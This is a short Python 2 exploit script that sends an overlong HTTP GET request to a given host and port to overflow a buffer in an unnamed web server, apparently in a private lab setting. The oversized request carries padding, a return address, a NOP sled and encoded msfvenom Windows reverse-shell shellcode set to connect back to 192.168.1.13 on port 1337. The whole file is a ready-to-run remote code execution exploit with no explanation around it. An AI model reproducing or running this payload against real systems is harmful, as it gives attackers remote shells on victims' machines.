#!/usr/bin/python
import socket
import sys

if (len(sys.argv) != 3):
    print "Usage: python " + sys.argv[0] + " <IP> <PORT>"
    sys.exit()
host = sys.argv[1]
port = sys.argv[2]

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.13 LPORT=1337 -f c -e x86/shikata_ga_nai -b "\x00\x0d"
shellcode = ("\xda\xc7\xbf\x4e\x2a\x42\xf1\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x52\x31\x7e\x17\x83\xee\xfc\x03\x30\x39\xa0\x04\x30\xd5\xa6"
"\xe7\xc8\x26\xc7\x6e\x2d\x17\xc7\x15\x26\x08\xf7\x5e\x6a\xa5"
"\x7c\x32\x9e\x3e\xf0\x9b\x91\xf7\xbf\xfd\x9c\x08\x93\x3e\xbf"
"\x8a\xee\x12\x1f\xb2\x20\x67\x5e\xf3\x5d\x8a\x32\xac\x2a\x39"
"\xa2\xd9\x67\x82\x49\x91\x66\x82\xae\x62\x88\xa3\x61\xf8\xd3"
"\x63\x80\x2d\x68\x2a\x9a\x32\x55\xe4\x11\x80\x21\xf7\xf3\xd8"
"\xca\x54\x3a\xd5\x38\xa4\x7b\xd2\xa2\xd3\x75\x20\x5e\xe4\x42"
"\x5a\x84\x61\x50\xfc\x4f\xd1\xbc\xfc\x9c\x84\x37\xf2\x69\xc2"
"\x1f\x17\x6f\x07\x14\x23\xe4\xa6\xfa\xa5\xbe\x8c\xde\xee\x65"
"\xac\x47\x4b\xcb\xd1\x97\x34\xb4\x77\xdc\xd9\xa1\x05\xbf\xb5"
"\x06\x24\x3f\x46\x01\x3f\x4c\x74\x8e\xeb\xda\x34\x47\x32\x1d"
"\x3a\x72\x82\xb1\xc5\x7d\xf3\x98\x01\x29\xa3\xb2\xa0\x52\x28"
"\x42\x4c\x87\xff\x12\xe2\x78\x40\xc2\x42\x29\x28\x08\x4d\x16"
"\x48\x33\x87\x3f\xe3\xce\x40\x80\x5c\xd1\x9d\x68\x9f\xd1\x98"
"\x51\x16\x37\xc8\xb1\x7e\xe0\x65\x2b\xdb\x7a\x17\xb4\xf1\x07"
"\x17\x3e\xf6\xf8\xd6\xb7\x73\xea\x8f\x37\xce\x50\x19\x47\xe4"
"\xfc\xc5\xda\x63\xfc\x80\xc6\x3b\xab\xc5\x39\x32\x39\xf8\x60"
"\xec\x5f\x01\xf4\xd7\xdb\xde\xc5\xd6\xe2\x93\x72\xfd\xf4\x6d"
"\x7a\xb9\xa0\x21\x2d\x17\x1e\x84\x87\xd9\xc8\x5e\x7b\xb0\x9c"
"\x27\xb7\x03\xda\x27\x92\xf5\x02\x99\x4b\x40\x3d\x16\x1c\x44"
"\x46\x4a\xbc\xab\x9d\xce\xcc\xe1\xbf\x67\x45\xac\x2a\x3a\x08"
"\x4f\x81\x79\x35\xcc\x23\x02\xc2\xcc\x46\x07\x8e\x4a\xbb\x75"
"\x9f\x3e\xbb\x2a\xa0\x6a")     #size = 351

print 'Sending Evil Bufffer...\r\n'
buff = "GET "
buff += 'A' * 1787 + '\x4F\x2D\x51\x76' + '\x90' * 20 + shellcode
buff += " HTTP/1.1\r\n"
buff += "Host: 192.168.1.10\r\n"
buff += "User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
buff += "Accept: text/html,applocation/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
buff += "Accept-Language: en-US,en;q=0.5\r\n"
buff += "Connection: close\r\n"
buff += "\r\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
s.send(buff)
s.close()
